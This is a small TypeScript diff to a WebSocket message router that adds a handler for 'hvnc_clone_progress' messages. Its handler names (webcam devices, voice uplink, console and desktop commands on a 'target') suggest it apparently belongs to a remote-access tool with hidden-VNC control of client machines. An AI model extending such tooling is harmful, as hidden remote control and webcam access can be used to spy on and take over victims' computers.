@@ -71,6 +71,7 @@ type WsLifecycleDeps = {
   handleNotification: (clientId: string, payload: any) => void;
   handleVoiceUplink: (clientId: string, payload: any) => void;
   handleWebcamDevices: (clientId: string, payload: any) => void;
+  handleHVNCCloneProgress: (clientId: string, payload: any) => void;
   cleanupVoiceViewer: (ws: ServerWebSocket<SocketData>) => void;
   stopConsoleOnTarget: (target: ClientInfo | undefined, sessionId: string) => void;
   sendDesktopCommand: (target: ClientInfo | undefined, commandType: string, payload: Record<string, unknown>) => void;
@@ -293,6 +294,9 @@ export function handleWebSocketMessage(
         break;
       case "webcam_devices":
         deps.handleWebcamDevices(info.id, payload);
+        break;
+      case "hvnc_clone_progress":
+        deps.handleHVNCCloneProgress(info.id, payload);
         break;
       default:
         break;
